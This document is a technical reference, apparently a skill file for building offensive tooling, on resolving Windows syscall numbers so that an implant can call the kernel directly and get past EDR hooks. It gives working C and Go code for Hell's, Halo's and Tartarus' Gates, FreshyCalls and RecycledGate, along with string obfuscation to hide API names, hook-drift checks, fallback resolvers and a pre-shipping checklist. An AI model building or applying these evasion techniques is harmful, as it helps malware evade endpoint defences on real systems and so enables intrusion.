# SSN Resolution Strategies — Detail

Deep dive on each of Hell's / Halo's / Tartarus' / FreshyCalls / RecycledGate. Read on demand; the main SKILL covers the decision tree.

## Table of Contents

1. Ntdll stub layout (reference)
2. Hell's Gate — the original
3. Halo's Gate — the fallback
4. Tartarus' Gate — the multi-pattern
5. FreshyCalls — the sorted-by-address
6. Recycled Gate / DWhisper — the hook-immune
7. Detection footprint comparison
8. Migration — swapping strategies

---

## 1. Ntdll stub layout

Clean (unhooked) `NtAllocateVirtualMemory` stub on Windows 10 19041+:

```
4C 8B D1                mov     r10, rcx
B8 18 00 00 00          mov     eax, 18h        ; SSN = 0x18
F6 04 25 08 03 FE 7F 01 test    byte [0x7FFE0308], 1
75 03                   jnz     short $+5
0F 05                   syscall
C3                      ret
CD 2E                   int     0x2E            ; WoW64 fallback
C3                      ret
```

The "test byte" at byte 8 checks a TEB field that indicates whether this thread is in WoW64 (32-bit emulation). On pure x64 processes, byte[0x7FFE0308] == 0 → the `jnz` is not taken → `syscall` executes.

**Hook patterns you will see**:

```
E9 <rel32>          ; Defender, CrowdStrike: 5-byte JMP at byte 0
90 90 90 E9 ...     ; Some EDRs: NOP sled before JMP
48 FF 25 <rip+0>    ; 6-byte RIP-relative indirect JMP
FF 25 <rip+0> XX... ; Kaspersky: 8-byte variant
```

Anything byte-level at offset 0 disrupts Hell's Gate's read of the SSN at offset 4.

---

## 2. Hell's Gate

```c
uint32_t GetSSN(void *stub) {
    // Verify classic preamble: 4C 8B D1 B8
    if (*(uint32_t *)stub != 0xB8D18B4C) return (uint32_t)-1;
    return *(uint32_t *)((uint8_t *)stub + 4);  // SSN at offset 4
}
```

**Cost**: ~3 instructions per lookup, no init.
**Failure mode**: hooked stubs return `(uint32_t)-1`; caller must have a fallback.
**Footprint**: unique byte pattern `4C 8B D1 B8` checked at runtime — not directly detectable, but the absence of ntdll imports combined with direct reads from loaded ntdll memory is a weak signal.

---

## 3. Halo's Gate

Extends Hell's with neighbor traversal:

```c
uint32_t GetSSN_Halo(void *base_stub, int max_walk) {
    for (int delta = 0; delta <= max_walk; delta++) {
        for (int dir = -1; dir <= 1; dir += 2) {
            void *candidate = (uint8_t *)base_stub + (dir * delta * 32);
            // Each Nt stub is 32 bytes. Walk by ±32.
            if (*(uint32_t *)candidate == 0xB8D18B4C) {
                uint32_t neighbor_ssn = *(uint32_t *)((uint8_t *)candidate + 4);
                return neighbor_ssn - (dir * delta);  // Adjust by walk distance
            }
        }
    }
    return (uint32_t)-1;
}
```

**Key insight**: SSNs are assigned sequentially by stub order in ntdll. `NtCreateFile` SSN is one less than `NtOpenFile`. If your target is hooked but its neighbor isn't, read the neighbor's SSN and adjust.

**Failure mode**: EDRs that hook *all* Nt* stubs (Defender for Endpoint ≥2022) — no neighbor is clean. Halo's degenerates to `(uint32_t)-1`.

**Cost**: O(max_walk) worst case; typically 1-3 reads.

---

## 4. Tartarus' Gate

Extends Halo's with multi-pattern recognition. Recognizes the most common 4-byte hook prologues in addition to the clean `4C 8B D1 B8`:

```
E9 ?? ?? ?? ??     → JMP rel32 → attempt to follow and read SSN at destination
FF 25 ?? ?? ?? ??  → indirect JMP → dereference and continue
```

**Pseudocode**:

```c
uint32_t GetSSN_Tartarus(void *stub) {
    uint8_t *p = stub;
    // Classical
    if (*(uint32_t *)p == 0xB8D18B4C)
        return *(uint32_t *)(p + 4);
    // JMP rel32 at offset 0
    if (p[0] == 0xE9) {
        int32_t rel = *(int32_t *)(p + 1);
        void *target = p + 5 + rel;
        // EDR trampolines usually preserve the SSN-load pattern somewhere
        return scan_forward_for_B8(target, 32);
    }
    // Fall through to Halo walk
    return GetSSN_Halo(stub, 16);
}
```

**Cost**: higher per-call; viable as a fallback tier.
**Note**: EDRs actively counter Tartarus by using non-standard hook prologues (e.g., `xchg rax, [rip+?]`) that don't match any known pattern. Treat it as a legacy strategy.

---

## 5. FreshyCalls

**Principle**: ntdll is built such that the stub addresses of `Zw*` exports are monotonically increasing with SSN. Sort exports by address; the index in the sorted list IS the SSN.

```c
typedef struct { char *name; uintptr_t rva; } Entry;

void FreshyInit(void *ntdll_base, HashMap *out) {
    Entry entries[2048]; int n = 0;
    walk_export_table(ntdll_base, &entries, &n,
                      filter: name starts with "Zw");
    qsort(entries, n, sizeof(Entry), cmp_rva);
    for (int i = 0; i < n; i++) {
        hashmap_put(out, entries[i].name, i);
    }
}
```

**Cost**: O(n log n) at init; O(1) lookup after.
**Hook immunity**: hooks modify stub BYTES, not the export table. Export table lives in `.rdata`, treated as read-only. FreshyCalls does not read a single stub byte.

**This is the foundation of RecycledGate.** "FreshyCalls" in the wild refers specifically to the `@crummie5` release, which additionally obfuscates API name strings.

---

## 6. Recycled Gate / DWhisper

FreshyCalls + systematic obfuscation + gadget-site caching + Zw/Nt dual-alias handling + hook-drift revalidation. The production evolution.

### Enhancements over FreshyCalls

**a. Dual-alias SSN table**. Zw* and Nt* are aliases. FreshyCalls iterates only one prefix; RecycledGate builds a table indexed by *either* prefix's hash, so a caller can `dispatch(hash("NtAllocateVirtualMemory"))` or `dispatch(hash("ZwAllocateVirtualMemory"))` interchangeably.

**b. Gadget cache (`GetRecyCall`)**. After SSN table build, walk the Zw* list and find the first export for which `stub_addr + 18` reads `0F 05 C3` (syscall; ret). Cache this address. That's the gadget for ALL subsequent indirect calls. No per-dispatch scanning.

**c. String obfuscation**. API names never appear as plaintext. Macro `Xr(hash_seed, key)` compile-time-mixes the name into a table key. `strings` reveals only scrambled bytes.

**d. Hook drift detection**. Before dispatch, optionally re-read the gadget's 3 bytes. If they no longer match `0F 05 C3`, some EDR started hooking mid-runtime — scan forward for a replacement gadget. Never happens in practice; defensive.

**e. Module-handle revalidation**. If attack surface includes DLL injection racing (EDR injects hooks after implant runs), record ntdll load-time vs discovery-time timestamps. Stale by > 1s → rescan.

### The DWhisper name

"DWhisper" denotes the AMD64-indirect-dispatch variant of the SysWhispers family. The RecycledGate project combines DWhisper (for dispatch) with the FreshyCalls-style sorted table (for SSN lookup). Some repos use the names interchangeably.

### Sketch

```go
type RecycledGate struct {
    ssn     map[uint64]uint16    // seeded_hash(api_name) -> SSN
    gadget  uintptr              // cached syscall;ret address
}

func Init() *RecycledGate {
    ntdll := findNtdllBase()  // PEB walk
    exports := parseExports(ntdll, func(name []byte) bool {
        return bytes.HasPrefix(name, []byte{'Z', 'w'})
    })
    sortByRVA(exports)
    r := &RecycledGate{ssn: make(map[uint64]uint16, len(exports))}
    for i, e := range exports {
        r.ssn[seededHash(e.name)] = uint16(i)
        r.ssn[seededHash(altPrefix(e.name, "Nt"))] = uint16(i)
    }
    for _, e := range exports {
        addr := ntdll + e.rva
        if bytes.Equal(read(addr+18, 3), []byte{0x0F, 0x05, 0xC3}) {
            r.gadget = addr + 18
            break
        }
    }
    return r
}

func (r *RecycledGate) Dispatch(apiHash uint64, args ...uintptr) uint32 {
    ssn, ok := r.ssn[apiHash]
    if !ok { return STATUS_NOT_FOUND }
    return reCycall(ssn, r.gadget, args...)
}
```

---

## 7. Detection footprint comparison

| Strategy | Reads stub bytes | Reads export table | Name-hash table | Obfuscated strings |
|---|---|---|---|---|
| Hell's Gate | Yes (dispatch time) | No (uses hardcoded offset) | No | No |
| Halo's Gate | Yes (dispatch time) | No | No | No |
| Tartarus' Gate | Yes (dispatch time) | No | No | No |
| FreshyCalls | No | Yes (init only) | Yes | No |
| RecycledGate | No | Yes (init only) | Yes | Yes |

"Reads stub bytes" at dispatch time is the primary behavioral signal. EDRs can instrument reads from their own hooked regions. Strategies that avoid this are structurally stealthier.

"Reads export table" is indistinguishable from normal Windows loader behavior — every process does this constantly.

---

## 8. Migration between strategies

Replacing a Hell's/Halo's dispatcher with RecycledGate:

1. Add init function that parses ntdll exports once
2. Replace per-call `GetSSN(stub)` with `r.ssn[hash(api_name)]`
3. Replace per-call stub-scan with cached `r.gadget`
4. Replace plaintext API name references with seeded-hash constants
5. Remove the neighbor-walk fallback — RecycledGate never needs it

The public-facing API (`dispatch(api_hash, args...)`) stays identical; the internals collapse from ~300 lines of stub-pattern logic to ~100 lines of table lookup.

Test after migration by comparing NTSTATUS returns for a panel of APIs with known good behavior: `NtOpenProcess(current_pid)`, `NtQuerySystemInformation(SystemBasicInformation)`, `NtAllocateVirtualMemory`. Any discrepancy → SSN table is wrong → verify by comparing against a fresh `!gle` or `ntdoc.m417z.com` lookup.

---

## 9. 2026 gate families beyond the classic five

The original sequence (Hell's/Halo's/Tartarus/Freshy/Recycled) is still the right conceptual ladder, but current implementations usually expose additional resolver routes:

- **SyscallsFromDisk / KnownDlls resolver**
    - Maps a clean `ntdll` image from `\\KnownDlls\\ntdll.dll`.
    - Resolves SSNs from clean bytes, independent of current process hook state.
    - Strong fallback when in-memory copy is aggressively patched.

- **HW Breakpoint resolver (DR registers + VEH)**
    - Places hardware breakpoints near syscall transition points and captures SSN from register state.
    - Useful for edge cases where byte-level stub reads are actively sabotaged.
    - Higher complexity and runtime footprint; keep as selective fallback, not default.

- **Clean Nt* function-pointer mode (non-gadget path)**
    - Resolve clean Nt* export and invoke function pointer directly.
    - Improves stack/RIP normalcy in some detection models; does not remove kernel-side telemetry.

### Recommended resolver policy

Use a deterministic route order and log route decisions:

1. Recycled/Freshy-style sorted export mapping.
2. Optional opcode cross-check on clean stubs.
3. KnownDlls/disk resolver fallback when confidence is low.
4. HWBP fallback only for selected high-value APIs.

Avoid ad-hoc per-call switching with no telemetry; it makes debugging impossible.

---

## 10. Gate quality checklist (implementation review)

Before shipping a dispatcher, verify:

- SSN resolution is runtime-derived (no hardcoded syscall IDs in release path).
- `syscall;ret` gate is validated and cached, not blindly assumed.
- 4/6/11-argument wrappers produce correct NTSTATUS on test panel.
- Resolver mode changes do not require touching wrapper signatures.
- Debug mode emits: resolver route, resolved SSN, selected gate, NTSTATUS.

If any item fails, fix architecture before adding additional obfuscation.
